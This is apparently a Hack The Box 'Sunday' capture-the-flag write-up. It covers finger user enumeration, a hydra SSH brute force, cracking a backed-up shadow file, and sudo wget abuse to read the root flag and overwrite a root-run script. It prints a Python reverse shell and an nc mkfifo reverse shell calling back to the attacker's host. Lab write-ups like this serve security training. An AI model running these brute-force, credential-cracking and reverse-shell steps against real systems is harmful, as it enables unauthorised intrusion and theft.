---
title: "Layout: Post with Table of Contents"
header:
  image: https://www.hackthebox.com/storage/avatars/3a186834eba2b780dacdaadcc157d309.png
tags:
  - table of contents
  - shadow·backup
  - OverWrite
  - SudoExploitation
  - sshBruteForce
  - Linux
  - Easy
  - HTB
toc: true
toc_label: "Unique Title"
toc_icon: "heart"
---






## Information
```bash

10.10.10.76

PORT      STATE SERVICE  VERSION
79/tcp    open  finger?
| fingerprint-strings: 
|   GenericLines: 
|     Login Name TTY Idle When Where
|     sunny ??? pts/1 4 Fri 06:43 10.10.14.2
|   GetRequest: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|   HTTPOptions: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|     OPTIONS ???
|   Help: 
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest: 
|     Login Name TTY Idle When Where
|     OPTIONS ???
|_    RTSP/1.0 ???
| finger: Login       Name               TTY         Idle    When    Where\x0D
|_sunny           ???            pts/1          6 Fri 06:43  10.10.14.2          \x0D
111/tcp   open  rpcbind  2-4 (RPC #100000)
515/tcp   open  printer
6787/tcp  open  ssl/http Apache httpd 2.4.33 ((Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14)
| ssl-cert: Subject: commonName=sunday
| Subject Alternative Name: DNS:sunday
| Not valid before: 2021-12-08T19:40:00
|_Not valid after:  2031-12-06T19:40:00
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
22022/tcp open  ssh      OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e (RSA)
|_  256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port79-TCP:V=7.92%I=7%D=9/9%Time=631AF179%P=x86_64-pc-linux-gnu%r(Gener
SF:icLines,93,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\nsunny\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20pts/1\x20\x20\x20\x20\x20\x20\x20\x20\x20\x204\x20Fri\x
SF:2006:43\x20\x2010\.10\.14\.2\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\r\
SF:n")%r(GetRequest,93,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\n/\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\?\?\?\r\nGET\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\?\?\?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(Help,5D,"Login\x20\x20\x20\
SF:x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When
SF:\x20\x20\x20\x20Where\r\nHELP\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(HTTPOptions,93,"Login\x20\
SF:x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20
SF:\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nHTTP/1\.0\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r
SF:(RTSPRequest,93,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\?\?\?\r\nOPTIONS\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\?\?\?\r\nRTSP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\?\?\?\r\n");


┌──(root㉿kali)-[/home/kali/HTB/Sunday]
└─# nc -vn 10.10.10.76 79 
(UNKNOWN) [10.10.10.76] 79 (finger) open
Login       Name               TTY         Idle    When    Where
sammy           ???            pts/2         23 Fri 08:11  10.10.14.2          
sunny           ???            pts/1         57 Fri 06:43  10.10.14.2

```



## GetShell

### sshBruteForce - sunday
```bash
┌──(root㉿kali)-[/home/kali/HTB/Sunday]
└─# hydra -V -f -l sunny -P /PenTesting/dic/rockyou.txt -s 22022 -V 10.10.10.76 ssh
[22022][ssh] host: 10.10.10.76   login: sunny   password: sunday

```


### shell privilege - sammy

**shadow BruteForce**  
```bash
[+] We can sudo without supplying a password!
User sunny may run the following commands on sunday:
    (root) NOPASSWD: /root/troll

sunny@sunday:/backup$ cat shadow.backup
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
sunny@sunday:/backup$

┌──(root㉿kali)-[/home/kali/HTB/Sunday]
└─# john --wordlist=/PenTesting/dic/rockyou.txt shadow.backup 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha256crypt, crypt(3) $5$ [SHA256 128/128 AVX 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sunday           (sunny)     
cooldude!        (sammy)

┌──(root㉿kali)-[/home/kali/HTB/Sunday]
└─# hashcat shadow.backup /PenTesting/dic/rockyou.txt --user
$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:cooldude!


sunny@sunday:~$ 
[+] We can sudo without supplying a password!
User sunny may run the following commands on sunday:
    (root) NOPASSWD: /root/troll


[+] We can read root's home directory!
total 3


```



## GetRoot.flag


```bash



[+] We can sudo without supplying a password!
User sammy may run the following commands on sunday:
    (ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```
### 0x01 wget 读取
```bash
-bash-4.4$ sudo wget --input-file /root/root.txt
--2022-09-12 21:46:41--  http://fb40fab61d99d37536daeec0d97af9b8/
Resolving fb40fab61d99d37536daeec0d97af9b8 (fb40fab61d99d37536daeec0d97af9b8)... failed: temporary name resolution failure.
wget: unable to resolve host address 'fb40fab61d99d37536daeec0d97af9b8'

```




## GetRoot
```bash
sunny@sunday:~$ sudo -l
User sunny may run the following commands on this host:
    (root) NOPASSWD: /root/troll

sunny@sunday:~$ sudo /root/troll
testing
uid=0(root) gid=0(root)




```

### 覆盖troll文件

#### python reverse shell
```python
#!/usr/bin/python

import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.10",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"]);

```

```bash
-bash-4.4$ sudo wget http://10.10.14.10/pri.py -O /root/troll
```

![[Pasted image 20230323052326.png]]

#### rm nc reverse shell

```bash
sleep 2;sudo wget http://10.10.14.10/re.sh -O /root/troll


root@kali:/home/kali/HTB/Sunday# cat re.sh 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.10 2233 >/tmp/f

```
![[Pasted image 20230323052042.png]]
使用sammy账户下载
sunny账户执行


#### SudoExploitation 
```bash
#覆盖会被重置 需要及时执行
┌──(root㉿kali)-[/home/kali/HTB/Sunday]
└─# cat root.sh 
#!/usr/bin/bash
bash



sammy@sunday:~$ sleep 2;sudo wget http://10.10.14.10/root.sh -O /root/troll




sunny@sunday:~$ sudo /root/troll
root@sunday:/home/sunny# 

```
![[Pasted image 20230323052444.png]]





## Sum up
```bash
root@sunday:/root# cat overwrite
#!/usr/bin/bash

while true; do
        /usr/gnu/bin/cat /root/troll.original > /root/troll
        /usr/gnu/bin/sleep 5
done


root@sunday:~# cat troll.original
#!/usr/bin/bash

/usr/bin/echo "testing"
/usr/bin/id
```





